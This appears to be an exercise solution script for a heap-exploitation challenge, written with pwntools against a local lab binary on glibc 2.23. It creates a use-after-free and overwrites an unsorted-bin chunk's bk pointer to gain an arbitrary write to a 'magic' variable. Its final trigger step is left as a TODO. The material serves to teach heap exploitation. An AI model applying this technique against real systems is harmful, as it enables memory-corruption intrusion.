#!/usr/bin/env python3
'''
Unsorted Bin Attack Challenge solution
'''

from pwn import * 
import os

mode = 'DEBUG' # Turn on gdb
libc_name = '../../../libc_versions/2.23/libc-2.23.so' # For alternate version of libc
env = {}

# Binary setup
elf_name = '.magic_value-2.23'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = process(elf.path,env=env)
	gdb.attach(p, gdbscript='''
dir ../../../libc_versions/2.23/
''') 
else: 
	p = process(elf.path, env=env) 

'''
Creates a string 

Parameter: 
	- string: the text to be put into the string.
'''
def create_string(string):
	p.sendlineafter(">", "1") 
	p.sendlineafter(">", str(string))

'''
View A string

Parameter:
	- index: The index of the string to print
Returns: 
	- The output from the print
'''
def view_string(index): 
	p.sendlineafter(">", "4")
	p.sendlineafter(">", str(index))
	p.recvuntil("Your string:") # Right before string output

	# Outputted data
	output = p.recvuntil(b"Welcome").replace(b"Welcome",b"") 
	return output

'''
Delete a string 

Parameter: 
	- index: The index of the string to remove
'''	
def delete_string(index): 
	p.sendlineafter(">", "3")
	p.sendlineafter(">", str(index))
	return 

''' 
Edit a string
Parameters: 
	- index: The index of the string to edit
	- string: The text to be put into the string
'''
def edit_string(index, string):
	p.sendlineafter(">", "2") 
	p.sendlineafter(">", str(index))
	p.sendlineafter(">", string)
	return 

def trigger_bug():
	###########################
	# SETUP ###################
	###########################
	''' 
	Instead of settting the ptr to zero in the lst, it just 
	decrements the counter for the size. 

	So, if we free a 'string' that is not at the top of the list
	there is a 'use after free' that is created. 

	We allocate two 'strings' and free index 0. Now, there is a
	UAF on the 0th index. 
	'''
	print("Allocate two chunks")
	create_string("ONE")   # Index 0 
	create_string("TWO")   # Index 1
	##########################
	#### Trigger #############
	##########################
	# Free index 0 -- This creates a use after free on the malloc chunk at index 0. 
	'''
	This chunks goes into the unsorted bin because of the size. 
	The chunk directly above (index 1) is important because if 
	this chunk was not there, then the chunk would be next to the 
	top chunk as free. 

	Unsorted bin chunks which are adjacent to the top chunk are 
	unlinked and added to the top chunk.

	It should be noted that if there was only one chunk, this would not work. 
	This is because the chunk would be consoldiated by the top chunk. 
	''' 
	print("Delete second chunk in order to triger use after free (UAF) ")
	delete_string(0) 
	return 0 

def unsorted_bin_attack(index): 
	'''
	The 0th index is accessible even though the chunk has already been 
	freed. This chunk is currently in the unsorted bin. 

	Unsorted bin chunks look like the following: 
	- prev_size 
	- size 
	- forward ptr 
	- back ptr
	'''

	''' 
	Line 3472 is where the bk pointer from the chunk is being accessed.
	It is doing the following: 
		bck = unsorted_bin_chunk->bk; // We control bk, therefore, bck!

	Source: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3477

	Next, the location of bck->fd is written to. This looks like the 
	following: 	
		bck->fd = large_value; 
		
	Source: https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3517.
	

	The bk ptrs fd ptr of the unsorted bin chunk is being 
	written to at a very large value (the location of the bin, to be 
	precise) and we control the bck ptr! This allows for an 
	arbitrary WRITE-WHERE primitive. 

	So, if we set the location of 'magic' to be the bck ptr, then 
	we can write a large value here!

	Although, there is one small trick here... bck->fd is actually
	the following: 
		bck+0x10 = large_value

	In order to write to the magic vlaue, we need to write to 'magic address' - 0x10 
	in order to account for the 'fd' struct offset. 
	'''


	##########################
	#### Create Fake Chunk ###
	##########################
	print("Fake chunk add 'fd' of unsorted bin chunk with garbage")
	fake_data = b"A" * 8 # Fd of unsorted bin chunk. Does not matter what the value is
	
	print("Fake chunk add 'bk' pointer with 'magic' address - 0x10")
	fake_data += p64(magic_loc - 0x10) 

	print("Overwrite 'fd' and 'bk' of unsorted bin chunk")
	edit_string(index, fake_data) # Edit the actual that has the UAF on it.

'''
Trigger the unsorted bin to be used
'''
def trigger():
	''' 
	This actually triggers the code being ran for the unsorted bin attack. 
	This happens when an allocation reaches the unsorted_bin processing. 
	'''

	#TODO#3: Trigger the overwrite with call to malloc
	print("Trigger unsorted bin attack by allocating a new chunk")

# Location of the magic value in memory
magic_loc = elf.symbols['magic']

# Trigger the vulnerability. 
# Creates a UAF on index.
UAF_index = trigger_bug() 

# Setup the unsorted bin attack 'bk' overwrite
unsorted_bin_attack(UAF_index) 

# Hit the unsorted bin attack 
trigger()



p.interactive()


